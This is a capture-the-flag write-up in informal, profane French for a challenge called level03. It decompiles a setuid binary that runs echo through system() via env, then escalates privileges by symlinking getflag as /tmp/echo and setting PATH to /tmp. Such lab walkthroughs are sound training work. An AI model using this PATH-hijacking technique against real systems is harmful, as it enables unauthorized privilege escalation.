1) un simple ls montre un fichier binaire nommer level03. quand on l'execute ca affiche un simple Exploit me, bah mon reuf... ca va t'exploit fort

2) bon bah pas le temps de tourner en rond 1000 ans autours juste un gros ghidra dans ca mere pour le decompiler et ca va le faire

3) putain mais je vais serrer, VM DE MERDDDDDEEEEEEE. quand je lance ghidra les menu burger pour creer un nouveau project et importer le fichier ne s'affiche pas. mais putain. bon apres 10 min a cliquer dans le vide ca a enfin finit par ce lancer et ca donne ca une foit decompiler :

int main(int argc,char **argv,char **envp)

{
  __gid_t __rgid;
  __uid_t __ruid;
  int iVar1;
  
                    /* Unresolved local var: gid_t gid@[DW_OP_breg4(ESP): +24]
                       Unresolved local var: uid_t uid@[DW_OP_breg4(ESP): +28] */
  __rgid = getegid();
  __ruid = geteuid();
  setresgid(__rgid,__rgid,__rgid);
  setresuid(__ruid,__ruid,__ruid);
  iVar1 = system("/usr/bin/env echo Exploit me");
  return iVar1;
}

4) bon au final le programme est archi basic, les seul vrais ligne interresant c'est le call system pour appeler echo et tout les changement de groupe et de user ID. le 'exploit me' n'est pas afficher vient un pritf mais via un echo, donc un programe externe. Ca veut dire qu'on peut juste modifier le chemin de echo pour que a la place il appel getflag.

5) ca ce fait en deux ligne:
    - ln -s /bin/getflag /tmp/echo : via un lien symbolique on fait une copy de getflag dans /tmp que l'on appel "echo"

    - export PATH=/tmp : ensuite on force le PATH a aller chercher dans le dossier /tmp qui contien notre faut echo

6) quand on relance ./level03 cette fois il va executer getflag a notre place en ayant les permission

